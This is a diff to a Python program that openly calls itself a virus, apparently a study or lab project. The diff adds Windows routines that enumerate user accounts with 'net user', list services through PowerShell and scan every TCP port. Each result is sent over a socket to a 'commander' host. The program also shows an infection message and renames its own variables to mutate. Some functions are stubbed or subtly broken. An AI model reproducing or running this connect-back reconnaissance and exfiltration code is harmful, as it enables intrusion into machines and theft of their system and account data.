@@ -11,13 +11,40 @@ import random
 import re
 
 # ----------- Variables -----------
-host = '192.168.118.129' #Hacker's IP address as a string
+host = '' #Hacker's IP address as a string
 port = 9999
 target_os = None
 infection_message = "You've been infected!!"
 target_file_type = ".foo"
+timeout = 0.001
+
+windows_services_lister_ps1 = """
+# Define the IP address or hostname of the remote machine
+$remoteComputer = "192.168.118.1"
+
+# Get the list of services from the remote computer
+$services = Get-Service -ComputerName $remoteComputer
+
+# Print service details
+$services | ForEach-Object {
+    Write-Output "Service Name: $($_.Name)"
+    Write-Output "Display Name: $($_.DisplayName)"
+    Write-Output "Status: $($_.Status)"
+    Write-Output "---------------------------"
+}
+"""
 
 # ----------- Functions ----------- 
+
+def run_powershell_script(script):
+    try:
+        # Execute the PowerShell script
+        print("starting script")
+        result = subprocess.run(['powershell', '-Command', script], text=True, capture_output=True, check=True)
+        return result.stdout
+    except subprocess.CalledProcessError as e:
+        print(f"Error executing PowerShell script: {e}")
+        print(f"stderr: {e.stderr}")
 
 # -- Infection Message -- 
 #region
@@ -148,9 +175,6 @@ function: mutate_with_nop
 Insert a "no-operation" equivalent statement in code. This is done using 
 commands such as pass or unnecessary variable assignments. 
 """
-#TODO: If working implement ways to prepend lines too.
-#TODO: If prepend and append are working, integrate number number generator to prepend
-# and append random amounts of lines.
 def mutate_with_nop(code):
     mutated_lines = []
     found_end = False
@@ -176,7 +200,6 @@ swapped.
 This simulates register swapping in assembly for python by swapping around the names
 of variables. 
 """
-#TODO: Change the substitutions to reflect the actual variables in the virus.
 def swap_code(code):
     # IGNORE
     substitutions = {
@@ -204,20 +227,21 @@ def send_data(s, data):
 #endregion
 
 def get_ip():
-    try:
-        result = subprocess.run(['ifconfig'], capture_output=True, text=True)
+    command, ip_pattern = None, None
+    if target_os == "Windows":
+        command, ip_pattern = ['ipconfig'], re.compile(r'IPv4 Address[.\s]*: ([\d.]+)')
+    else: 
+        command, ip_pattern = ['ifconfig'], re.compile(r'inet\s+([\d.]+)')
 
-        # Extract IP addresses using regex
-        ip_pattern = re.compile(r'inet\s+([\d.]+)')
-        ip_addresses = ip_pattern.findall(result.stdout)
+    result = subprocess.run(command, capture_output=True, text=True)
 
-        for ip in ip_addresses:
-            if (ip.split('.')[0] in ['192', '10']):
-                return ip
+    # Extract IP addresses using regex
+    ip_addresses = ip_pattern.findall(result.stdout)
 
-    except Exception as e:
-        print(f"An error occurred: {e}")
-        return None
+    for ip in ip_addresses:
+        print("Hello world")
+        if (ip.split('.')[0] in ['192', '10']):
+            return ip
 
 def get_network_addr():
     ip = get_ip()
@@ -227,6 +251,18 @@ def get_network_addr():
     
     address_components = ip.split('.')
     return f"{address_components[0]}.{address_components[1]}.{address_components[2]}.0/24"
+
+def port_scan(target, timeout):
+    open_ports = []
+
+    for port in range(1, 65535):
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(timeout)
+            result = s.connect_ex((target, port))
+            print(f"Checking {port}")
+            if result == 0:
+                open_ports.append(port)
+    return open_ports
 
 def get_sys_info(s):
     send_data(s,"------------------- SYSTEM INFO -------------------")
@@ -251,6 +287,13 @@ def get_sys_info(s):
         send_data(s,f"Mac Version:", {platform.mac_ver()})
 
 def find_hosts_on_network(s):
+    if target_os == "Windows":
+        open_ports = port_scan(get_ip(), timeout)
+        send_data(s,f"------------------- {len(open_ports)} OPEN PORTS -------------------")
+        send_data(s, str('\n'.join(port)))
+        return
+
+    # If the OS is not Windows the below will run
     command = ['nmap', '-sn', get_network_addr()]
 
     # Run the command and capture the output
@@ -267,7 +310,49 @@ def find_hosts_on_network(s):
     
     send_data(s, '\n'.join(output))
 
+def windows_get_user_accounts():
+    # Get the list of user accounts
+    result = subprocess.run(['net', 'user'], text=True, capture_output=True, check=True)
+    lines = result.stdout.splitlines()
+
+    # Find the start and end indices for user accounts
+    start_index = next(i for i, line in enumerate(lines) if 'User accounts for' in line) + 1
+    end_index = next(i for i, line in enumerate(lines) if 'The command completed successfully' in line)
+        
+    # Extract user names
+    users = []
+    for line in lines[start_index:end_index]:
+        # Split the line and filter out empty parts
+        parts = [part.strip() for part in line.split() if part.strip()]
+        if parts:
+            # Use the first part as the username
+            users.extend(parts)
+    
+    return users[1:]
+
+def windows_get_user_details(user):
+    # Get user details
+    result = subprocess.run(['net', 'user', user], text=True, capture_output=True, check=True)
+    details = result.stdout.splitlines()
+    
+    # Parse details
+    user_info = {
+        'User': user,
+        'Full Name': '',
+        'Comment': '',
+        'Local Group Memberships': '',
+        'Global Group Memberships': '',
+        'Home Directory': 'N/A',
+        'Profile Path': 'N/A'
+    }
+    
+    return user_info
+
 def find_running_services(s):
+    if target_os == "Windows":
+        send_data(s, run_powershell_script(windows_services_lister_ps1))
+        return
+
     # This defines the nmap and its arguments
     command = ['nmap', '-sV', '-T4', '-v', get_network_addr()]
 
@@ -296,6 +381,23 @@ def find_running_services(s):
 
 def get_user_info(s):
     # Get the list of user accounts with UID >= 1000
+    if target_os == "Windows":
+        users = windows_get_user_accounts()
+
+        send_data(s, "------------------- User Info -------------------")
+        for user in users:
+            user_info = windows_get_user_details(user)
+            if user_info:
+                send_data(s, f"User: {user_info['User']}")
+                send_data(s, f"Full Name: {user_info['Full Name']}")
+                send_data(s, f"Comment: {user_info['Comment']}")
+                send_data(s, f"Local Group Memberships: {user_info['Local Group Memberships']}")
+                send_data(s, f"Global Group Memberships: {user_info['Global Group Memberships']}")
+                send_data(s, f"Home Directory: {user_info['Home Directory']}")
+                send_data(s, f"Profile Path: {user_info['Profile Path']}\n")
+        return
+    
+    # Runs if the os is Linux
     try:
         result = subprocess.run(['awk', '-F:', '$3 >= 1000 { print $1 }', '/etc/passwd'],
                                 text=True, capture_output=True, check=True)
@@ -324,6 +426,9 @@ def get_user_info(s):
 # (1) Retrieve host OS information.
 target_os = platform.system()
 
+host = get_ip()
+print(host)
+
 # (2) Establish connection with commander.
 s = socket.socket()
 s.connect((host, port))
@@ -334,23 +439,24 @@ send_data(s, f"Target OS: '{str(target_os)}'")
 post_infection_msg(target_os, infection_message)
 
 # (4) Data Exfiltration
+
+    # (4.1) Get system information - OS, Version, Distribution, etc.
 get_sys_info(s)
+
+    # (4.2) Get information about the user accounts including username...
 get_user_info(s)
-find_hosts_on_network(s)
+
+    # (4.3) Find the active hosts on the network.
+# find_hosts_on_network(s)
+
+    # (4.4) See what services are running & whats ports are open.
 find_running_services(s)
-    
-
-# 4.1 For now exfiltrate the type of OS that the host is, the pwd, 
-#      and the list of files in the current directory.
-
 
 # (5) Self Mutations
+
 virus = retrieve_code()
 # virus = mutate_with_nop(virus)
 virus = swap_code(virus)
-
-# exec_code = compile(''.join(virus), '<string>', 'exec')
-# print(f"  Co_code (bytecode): {exec_code.co_code}")
 
 
 # (6) Perform Self Spread
